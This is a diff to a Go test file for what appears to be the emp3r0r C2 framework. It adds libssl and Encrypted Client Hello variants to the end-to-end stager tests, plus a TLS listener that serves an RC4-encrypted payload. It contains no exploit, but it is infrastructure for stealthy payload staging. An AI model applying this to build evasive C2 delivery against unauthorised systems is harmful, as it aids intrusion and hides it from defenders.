@@ -8,6 +8,7 @@ import (
 	"crypto/ecdsa"
 	"crypto/rand"
 	"crypto/sha256"
+	"crypto/tls"
 	"crypto/x509"
 	"encoding/asn1"
 	"encoding/base64"
@@ -50,7 +51,18 @@ type stagerOpts struct {
 	unpacker string
 	// transport is the --transport argument passed to build.sh.
 	transport string
+	// ech enables Encrypted Client Hello (only meaningful for libssl). Hosts
+	// whose libssl lacks ECH (OpenSSL < 4.0) exercise the graceful fallback.
+	ech bool
+	// echConfig is the base64 ECHConfigList embedded when ech is set.
+	echConfig string
 }
+
+// testECHConfigList is a syntactically valid ECHConfigList (RFC 9849). On a
+// host whose libssl lacks ECH it is ignored; on an ECH-capable host it is sent
+// and the emp3r0r listener (which does not speak ECH) still completes the TLS
+// handshake.
+const testECHConfigList = "AD7+DQA65wAgACA8wVN2BtscOl3vQheUzHeIkVmKIiydUhDCliA4iyQRCwAEAAEAAQALZXhhbXBsZS5jb20AAA=="
 
 // artifactName returns the filename that build.sh produces for these options.
 func (o stagerOpts) artifactName() string {
@@ -88,7 +100,8 @@ func signUUID(uuidStr, keyFile string) (string, error) {
 // ---------------------------------------------------------------------------
 
 // TestAgentEndToEndLifecycle exercises the raw (unpacked) stager over all
-// supported C2 modes and download transports.
+// supported C2 modes and download transports (http, libcurl, libssl), plus an
+// optional-ECH libssl variant.
 func TestAgentEndToEndLifecycle(t *testing.T) {
 	if os.Getenv("CGO_ENABLED") != "1" {
 		t.Skip("Skipping test: CGO_ENABLED is not set to 1")
@@ -96,7 +109,7 @@ func TestAgentEndToEndLifecycle(t *testing.T) {
 	if os.Getenv("EMP3R0R_RACE_ON") == "1" {
 		t.Skip("Skipping test: race detector is enabled")
 	}
-	transports := []string{"http", "libcurl"}
+	transports := []string{"http", "libcurl", "libssl"}
 	for _, mode := range []string{def.C2ChannelModeH2Conn, "http_poll"} {
 		for _, tr := range transports {
 			mode, tr := mode, tr
@@ -106,6 +119,20 @@ func TestAgentEndToEndLifecycle(t *testing.T) {
 			})
 		}
 	}
+
+	// Exercise the optional ECH build path on the libssl transport. On a host
+	// without an ECH-capable libssl this asserts the graceful fallback (normal
+	// TLS still works); on an ECH-capable host it asserts ECH does not break the
+	// download against a non-ECH listener.
+	t.Run(def.C2ChannelModeH2Conn+"/libssl-ech", func(t *testing.T) {
+		opts := stagerOpts{
+			format:    "shellcode",
+			transport: "libssl",
+			ech:       true,
+			echConfig: testECHConfigList,
+		}
+		runAgentEndToEndLifecycle(t, def.C2ChannelModeH2Conn, opts)
+	})
 }
 
 // TestPackerEndToEnd exercises the self-unpacking packed stager for each
@@ -406,6 +433,9 @@ func runAgentEndToEndLifecycle(t *testing.T, mode string, opts stagerOpts) {
 	if opts.format == "packed" && opts.unpacker != "" {
 		buildArgs = append(buildArgs, "--unpacker", opts.unpacker)
 	}
+	if opts.ech {
+		buildArgs = append(buildArgs, "--ech", "on", "--ech-config", opts.echConfig)
+	}
 
 	buildCmd := exec.Command("./build.sh", buildArgs...)
 	buildCmd.Dir = ".."
@@ -467,8 +497,24 @@ func runAgentEndToEndLifecycle(t *testing.T, mode string, opts stagerOpts) {
 	//
 	// buildServedBlob RC4-encrypts the malasada payload with the key derived
 	// from stagerKey — matching rc4_crypt in downloader_main.
+	//
+	// The libssl transport speaks TLS, so it needs a TLS-terminating listener;
+	// everything else uses plain HTTP (in production TLS is usually terminated
+	// by a reverse proxy in front of the plain listener).
 	// -----------------------------------------------------------------------
 	go func() {
+		if opts.transport == "libssl" {
+			cert, err := tls.LoadX509KeyPair(transport.ServerCrtFile, transport.ServerKeyFile)
+			if err != nil {
+				logging.Errorf("Stager listener: failed to load TLS keypair: %v", err)
+				return
+			}
+			tlsCfg := &tls.Config{Certificates: []tls.Certificate{cert}, MinVersion: tls.VersionTLS12}
+			if err := listener.HTTPListenerTLS(payloadPath, stagerPortStr, stagerKey, tlsCfg); err != nil {
+				logging.Errorf("Stager TLS listener failed: %v", err)
+			}
+			return
+		}
 		if err := listener.HTTPListener(payloadPath, stagerPortStr, stagerKey); err != nil {
 			logging.Errorf("Stager listener failed: %v", err)
 		}
